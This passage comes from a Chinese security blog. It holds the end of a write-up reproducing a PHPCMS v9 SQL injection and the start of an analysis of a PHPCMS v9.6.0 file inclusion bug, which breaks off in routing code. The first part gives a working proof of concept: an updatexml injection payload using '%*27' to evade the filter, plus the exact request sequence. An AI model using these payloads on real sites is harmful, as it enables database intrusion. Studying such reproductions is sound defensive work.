class="string">''</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> $keyc.rtrim(strtr(base64_encode($result), <span class="string">'+/'</span>, <span class="string">'-_'</span>), <span class="string">'='</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>那也就是说在执行完swfupload_json()函数之后，我们可以获得CeFuT_att_json，这段经过phpcms内置的加密算法加密过的密文，其中有用户输入的信息，phpcms的加密算法，好像是那种比较难解的那种，获得这段密文是为第三步做打算。</p>
<p>最有意思的来了，真的很佩服把这个洞挖出来的作者，我反正是很欣赏<br>定位phpcms/modules/content/down.php::init()<br>根据路由，这是调用了content这个模块<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">defined(<span class="string">'IN_PHPCMS'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">'No permission resources.'</span>);</span><br><span class="line"><span class="comment">//模型缓存路径</span></span><br><span class="line">define(<span class="string">'CACHE_MODEL_PATH'</span>,CACHE_PATH.<span class="string">'caches_model'</span>.DIRECTORY_SEPARATOR.<span class="string">'caches_data'</span>.DIRECTORY_SEPARATOR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">down</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $db;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db = pc_base::load_model(<span class="string">'content_model'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$a_k = trim($_GET[<span class="string">'a_k'</span>]);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">isset</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">		$a_k = sys_auth($a_k, <span class="string">'DECODE'</span>, pc_base::load_config(<span class="string">'system'</span>,<span class="string">'auth_key'</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($a_k)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">		<span class="keyword">unset</span>($i,$m,$f);</span><br><span class="line">		parse_str($a_k);</span><br><span class="line">		var_dump(parse_str($a_k));</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($i)) $i = $id = intval($i);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">isset</span>($m)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">isset</span>($modelid)||!<span class="keyword">isset</span>($catid)) showmessage(L(<span class="string">'illegal_parameters'</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($f)) showmessage(L(<span class="string">'url_invalid'</span>));</span><br><span class="line">		$allow_visitor = <span class="number">1</span>;</span><br><span class="line">		$MODEL = getcache(<span class="string">'model'</span>,<span class="string">'commons'</span>);</span><br><span class="line">		$tablename = <span class="keyword">$this</span>-&gt;db-&gt;table_name = <span class="keyword">$this</span>-&gt;db-&gt;db_tablepre.$MODEL[$modelid][<span class="string">'tablename'</span>];</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db-&gt;table_name = $tablename.<span class="string">'_data'</span>;</span><br><span class="line">		$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));	</span><br><span class="line">		$siteids = getcache(<span class="string">'category_content'</span>,<span class="string">'commons'</span>);</span><br><span class="line">		$siteid = $siteids[$catid];</span><br><span class="line">		$CATEGORYS = getcache(<span class="string">'category_content_'</span>.$siteid,<span class="string">'commons'</span>);</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到在函数init()中，$a_k是由用户输入的，然后我们可以输入数据，数据经过phpcms内置的解密算法，得到明文下的$a_k（不难发现，我们之前获取的密文，它的解密算法刚好也是），然后经过parse_str()的操作会得到$a_k里的变量。<br>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rs = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id));</span><br></pre></td></tr></table></figure></p>
<p>$id是一个注入点，再看看哪里有没有过滤的函数，在attachments.php中调用了这个函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 安全过滤函数</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">	$string = str_replace(<span class="string">'%20'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%27'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'%2527'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'*'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">';'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&lt;'</span>,<span class="string">'&amp;lt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">"&#123;"</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'&#125;'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	$string = str_replace(<span class="string">'\\'</span>,<span class="string">''</span>,$string);</span><br><span class="line">	<span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们本来是想打算构造$id=’and updatexml(1,concat(0x7e,user(),0x7e),1)#<br>由于这里的%27被过滤了，<code>*</code>也是被过滤了，所以我们构造<strong><code>%*27</code></strong>来绕过这个过滤。</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>(1)最早的时候，我们说过得获取userid_flash才能绕过认证。<br>看到函数/phpcms/modues/wap/index.php，访问这个函数，获得<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CeFuT_siteid=b9abm4BFwt24EU_pjcBx3v1hUvFF_v8BiE3Mv8Og</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/18/phpcmsv9sql注入漏洞-复现/1.png" alt=""></p>
<p>(2)获取密文CeFuT_att_json<br>payload：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=<span class="number">1</span>&amp;src=&amp;id=%*<span class="number">27</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">1</span>,(user())),<span class="number">1</span>)<span class="comment">#&amp;m=1&amp;f=cookie&amp;modelid=1&amp;catid=1&amp;</span></span><br><span class="line"></span><br><span class="line">经过url加密后就是</span><br><span class="line">?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=<span class="number">1</span>&amp;src=%<span class="number">26</span>id%<span class="number">3</span>d%<span class="number">25</span>*<span class="number">27</span>+<span class="keyword">and</span>+updatexml(<span class="number">1</span>%<span class="number">2</span>cconcat(<span class="number">1</span>%<span class="number">2</span>c(user()))%<span class="number">2</span>c1)%<span class="number">23</span>%<span class="number">26</span>m%<span class="number">3</span>d1%<span class="number">26</span>f%<span class="number">3</span>dcookie%<span class="number">26</span>modelid%<span class="number">3</span>d1%<span class="number">26</span>catid%<span class="number">3</span>d1%<span class="number">26</span></span><br><span class="line">POST:userid_flash=b9abm4BFwt24EU_pjcBx3v1hUvFF_v8BiE3Mv8Og</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/18/phpcmsv9sql注入漏洞-复现/2.png" alt=""></p>
<p>获取密文：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CeFuT_att_json=d539pO1aNzvcSIma8JBD5LOxnutluUC2LKVABOKgNVjFm_JXUrrREEuNicRR4sqJgEoihvBC45SwrMnwSBdP3p0nr0qUOqDrPDkMKVWqUGYejPOr6YwvRRf3c0JbC4Rnwf_nkGeWhyLvAuYY6nV09T9gCArCA2F30qcfP9VQgIUL8IBeCHy7FvZZkQ</span><br></pre></td></tr></table></figure></p>
<p>(3)访问phpcms/modules/content/down.php::init()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?m=content&amp;c=down&amp;a=init&amp;a_k=d539pO1aNzvcSIma8JBD5LOxnutluUC2LKVABOKgNVjFm_JXUrrREEuNicRR4sqJgEoihvBC45SwrMnwSBdP3p0nr0qUOqDrPDkMKVWqUGYejPOr6YwvRRf3c0JbC4Rnwf_nkGeWhyLvAuYY6nV09T9gCArCA2F30qcfP9VQgIUL8IBeCHy7FvZZkQ</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/18/phpcmsv9sql注入漏洞-复现/3.png" alt=""></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>今天复现的时候，有一个地方一直没懂，就是这个payload中的id是怎么传入程序中，然后自己debug了一下，就是不理解为啥要在id前，甚至每个变量名前加&amp;,然后对照体会了一下，恍然大悟<br><img src="/2019/07/18/phpcmsv9sql注入漏洞-复现/4.png" alt=""><br><img src="/2019/07/18/phpcmsv9sql注入漏洞-复现/5.png" alt=""></p>
<p>还是要多学，而且时间觉得很紧，希望自己能够把时间合理使用，今天其实挺无奈的，没有理解&amp;id…..然后浪费了很多时间，群里一个师傅教我怎么动态调试，debug熟练使用真的能很好的理解代码。</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/16/phpcmsv9文件包含漏洞-复现/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/07/16/phpcmsv9文件包含漏洞-复现/" class="post-title-link" itemprop="url">phpcmsv9文件包含漏洞[复现]</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-07-16 19:53:37" itemprop="dateCreated datePublished" datetime="2019-07-16T19:53:37+08:00">2019-07-16</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-07-20 19:52:51" itemprop="dateModified" datetime="2019-07-20T19:52:51+08:00">2019-07-20</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>php 5.6<br>mysql 5.0<br>ubuntu 19<br>phpcmsv9.6.0(我下载的版本UTF8)</p>
<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>又是一整感觉，自己菜的明明白白，对函数的理解不够使深刻，然后分析函数的能力太差了，我自己都看不下去了。然后感谢<a href="https://www.freebuf.com/author/wnltc0" target="_blank" rel="noopener">wnltc0师傅</a>,十分耐心地和我讲解我不懂的点。然后这次花了挺长时间的，然后因为最后的POC靠自己整的，就成功了一半，因为，我下载的源码里有缺失，或者是我太笨了，看懵了，然后我就寻找另外一个触发点，结果失败了…….之后再琢磨一下。<br><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/1.png" alt=""></p>
<h1 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h1><p>代码本身存在bug，并且未对用户输入的内容进行过滤，使得用户可以上传恶意php文件，用户可以通过文件包含漏洞读取该恶意文件。</p>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>这次分析，分两部分完成，第一个是分析整个cms的路由，第二分析漏洞触发点</p>
<h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>定位：index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  index.php PHPCMS 入口</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span>			(C) 2005-2010 PHPCMS</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span>				http://www.phpcms.cn/license/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@lastmodify</span>			2010-6-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">//PHPCMS根目录</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'PHPCMS_PATH'</span>, dirname(<span class="keyword">__FILE__</span>).DIRECTORY_SEPARATOR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> PHPCMS_PATH.<span class="string">'/phpcms/base.php'</span>;</span><br><span class="line"></span><br><span class="line">pc_base::creat_app();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里include base.php，定位：/phpcms/base.php</p>
<p>然后跟进一下creat_app()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">creat_app</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">self</span>::load_sys_class(<span class="string">'application'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>调用<strong>load_sys_class()</strong>函数，跟进这个函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load_sys_class</span><span class="params">($classname, $path = <span class="string">''</span>, $initialize = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">self</span>::_load_class($classname, $path, $initialize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后这里有另外几个和load_sys_clas()作用位于同一层面的函数，逐个介绍一下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定位：/phpcms/base.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//_load_sys_class()</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 加载系统类方法</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $classname 类名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $path 扩展地址</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> intger $initialize 是否初始化</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load_sys_class</span><span class="params">($classname, $path = <span class="string">''</span>, $initialize = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">self</span>::_load_class($classname, $path, $initialize);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//_load_app_class()	</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 加载应用类方法</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $classname 类名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $m 模块</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> intger $initialize 是否初始化</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load_app_class</span><span class="params">($classname, $m = <span class="string">''</span>, $initialize = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">		$m = <span class="keyword">empty</span>($m) &amp;&amp; defined(<span class="string">'ROUTE_M'</span>) ? ROUTE_M : $m;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($m)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">self</span>::_load_class($classname, <span class="string">'modules'</span>.DIRECTORY_SEPARATOR.$m.DIRECTORY_SEPARATOR.<span class="string">'classes'</span>, $initialize);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//load_model()</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 加载数据模型</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $classname 类名</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load_model</span><span class="params">($classname)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">self</span>::_load_class($classname,<span class="string">'model'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//load_config()</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加载配置文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $file 配置文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $key  要获取的配置荐</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $default  默认配置。当获取配置项目失败时该值发生作用。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> boolean $reload 强制重新加载。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load_config</span><span class="params">($file, $key = <span class="string">''</span>, $default = <span class="string">''</span>, $reload = false)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $configs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (!$reload &amp;&amp; <span class="keyword">isset</span>($configs[$file])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($key)) &#123;</span><br><span class="line">                <span class="keyword">return</span> $configs[$file];</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($configs[$file][$key])) &#123;</span><br><span class="line">                <span class="keyword">return</span> $configs[$file][$key];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> $default;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $path = CACHE_PATH.<span class="string">'configs'</span>.DIRECTORY_SEPARATOR.$file.<span class="string">'.php'</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($path)) &#123;</span><br><span class="line">            $configs[$file] = <span class="keyword">include</span> $path;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($key)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $configs[$file];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($configs[$file][$key])) &#123;</span><br><span class="line">            <span class="keyword">return</span> $configs[$file][$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>load_config()</strong>函数调用了之后，会调用/caches/config/$file.php<br>而另外三个函数都会调用<code>**_load_class()**</code>方法，三个的差别在于参数有所不同。</p>
<p>跟进_load_class()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">_load_class</span><span class="params">($classname, $path = <span class="string">''</span>, $initialize = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> $classes = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($path)) $path = <span class="string">'libs'</span>.DIRECTORY_SEPARATOR.<span class="string">'classes'</span>;</span><br><span class="line"></span><br><span class="line">	$key = md5($path.$classname);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($classes[$key])) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($classes[$key])) &#123;</span><br><span class="line">			<span class="keyword">return</span> $classes[$key];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (file_exists(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.<span class="string">'.class.php'</span>)) &#123;</span><br><span class="line">		<span class="keyword">include</span> PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.<span class="string">'.class.php'</span>;</span><br><span class="line">		$name = $classname;</span><br><span class="line">		<span class="keyword">if</span> ($my_path = <span class="keyword">self</span>::my_path(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.<span class="string">'.class.php'</span>)) &#123;</span><br><span class="line">			<span class="keyword">include</span> $my_path;</span><br><span class="line">			$name = <span class="string">'MY_'</span>.$classname;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($initialize) &#123;</span><br><span class="line">			$classes[$key] = <span class="keyword">new</span> $name;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$classes[$key] = <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $classes[$key];</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当调用load_sys_class时，<strong>到 phpcms/libs/classes目录下找xx.class.php</strong></p>
<p>当调用load_app_class时，<strong>到phpcms/modules/模块名/classes/目录下找xx.class.php</strong></p>
<p>当调用load_model时，<strong>到phpcms/model目录下找xx.class.php</strong></p>
<p>如果$initialize=1时，包含类文件并实例化类，反之，仅包含类文件</p>
<p>然后我们回到creat_app()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">creat_app</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">self</span>::load_sys_class(<span class="string">'application'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>加载了php/libs/classes/application.class.php,实例化application类<br>跟进php/libs/classes/application.class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$param = pc_base::load_sys_class(<span class="string">'param'</span>);</span><br><span class="line">		define(<span class="string">'ROUTE_M'</span>, $param-&gt;route_m());<span class="comment">//模块</span></span><br><span class="line">		define(<span class="string">'ROUTE_C'</span>, $param-&gt;route_c());<span class="comment">//控制器</span></span><br><span class="line">		define(<span class="string">'ROUTE_A'</span>, $param-&gt;route_a());<span class="comment">//事件</span></span><br><span 